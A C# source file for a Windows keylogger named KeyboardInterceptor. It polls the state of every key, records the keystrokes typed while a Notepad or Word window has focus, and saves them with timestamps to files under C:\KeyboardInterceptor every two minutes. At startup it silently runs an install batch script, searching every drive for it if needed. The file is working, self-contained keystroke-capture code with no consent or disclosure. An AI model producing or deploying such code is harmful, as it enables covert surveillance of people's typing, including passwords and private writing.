using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mime;
using System.Text;
using System.Runtime.InteropServices;
using System.Timers;
using KeyboardInterceptor;
using Timer = System.Timers.Timer;

class Program
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    private static Timer _timer = new Timer();
    private static StringBuilder _buffer = new StringBuilder();
    private const int nChars = 256;

    private const string batchScript = "install_keyboard_interceptor.bat";

    static void Main()
    {
        if (!Directory.Exists(@"C:\KeyboardInterceptor"))
        {
            Directory.CreateDirectory(@"C:\KeyboardInterceptor");
        }

        if (!IsAppRegisteredInPath())
        {
            ExecuteBatchScript(batchScript);
        }

        _buffer.AppendLine("Keyboard Interceptor Started");

        AppDomain.CurrentDomain.ProcessExit += new EventHandler(Application_ApplicationExit);

        _timer.Interval = 120000;
        _timer.Elapsed += OnTimerElapsed;
        _timer.AutoReset = true;
        _timer.Enabled = true;

        int[] lastState = new int[255];
        while (true)
        {
            System.Threading.Thread.Sleep(10);
            for (int key = 0; key < 255; key++)
            {
                int state = GetAsyncKeyState(key);
                if (state != 0 && lastState[key] == 0)
                {
                    if (IsSpecificApplicationInFocus("Notepad") || IsSpecificApplicationInFocus("Word"))
                    {
                        var translatedKey = SmartKeyboardTranslate.ToKey(key);
                        _buffer.AppendLine($"{DateTime.Now}: {translatedKey}");
                        _timer.Stop();
                        _timer.Start();
                    }
                }

                lastState[key] = state;
            }
        }
    }

    private static bool IsAppRegisteredInPath()
    {
        string pathVariable = Environment.GetEnvironmentVariable("PATH", EnvironmentVariableTarget.Machine);
        string appPath = AppContext.BaseDirectory;
        return pathVariable.Contains(appPath);
    }

    private static void ExecuteBatchScript(string batchScript)
    {
        string appPath = AppContext.BaseDirectory;
        string batchScriptPath = Path.Combine(appPath, batchScript);

        if (!File.Exists(batchScriptPath))
        {
            batchScriptPath = FindFile(batchScript);

            if (batchScriptPath == null)
            {
                Console.WriteLine($"Error: Could not find {batchScript}.");
                return;
            }
        }

        Process.Start(new ProcessStartInfo
        {
            FileName = batchScriptPath,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            CreateNoWindow = true,
        });
    }

    public static string FindFile(string fileName)
    {
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (drive.IsReady)
            {
                try
                {
                    var files = Directory.GetFiles(drive.RootDirectory.FullName, fileName, SearchOption.AllDirectories);
                    if (files.Length > 0)
                    {
                        return files[0];
                    }
                }
                catch (UnauthorizedAccessException)
                {
                    Console.WriteLine("Ignore directories that the application doesn't have access to.");
                }
            }
        }

        return null;
    }

    private static bool IsSpecificApplicationInFocus(string applicationName)
    {
        StringBuilder Buff = new StringBuilder(nChars);
        IntPtr handle = GetForegroundWindow();

        if (GetWindowText(handle, Buff, nChars) > 0)
        {
            return Buff.ToString().Contains(applicationName);
        }

        return false;
    }

    static void Application_ApplicationExit(object sender, EventArgs e)
    {
        try
        {
            string logFilePath = $"log_{DateTime.Now:yyyyMMdd}.txt";
            File.AppendAllText(logFilePath, _buffer.ToString());
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine("Error: Access to the log file is denied.");
        }
        catch (IOException)
        {
            Console.WriteLine("Error: An I/O error occurred while opening the file.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An unexpected error occurred: {ex.Message}");
        }
    }

    private static void OnTimerElapsed(object sender, ElapsedEventArgs e)
    {
        if (_buffer.Length > 0)
        {
            string logFilePath = GetLogFilePath();
            File.AppendAllText(logFilePath, _buffer.ToString());
            _buffer.Clear();
        }
    }

    private static string GetLogFilePath()
    {
        DateTime now = DateTime.Now;
        string directoryPath = $@"C:\KeyboardInterceptor\{now.Year}\{now.Month}\{now.Day}";
        Directory.CreateDirectory(directoryPath);
        string fileName = $"{now.Hour}-{now.Minute}-{now.Second}.txt";
        return Path.Combine(directoryPath, fileName);
    }
}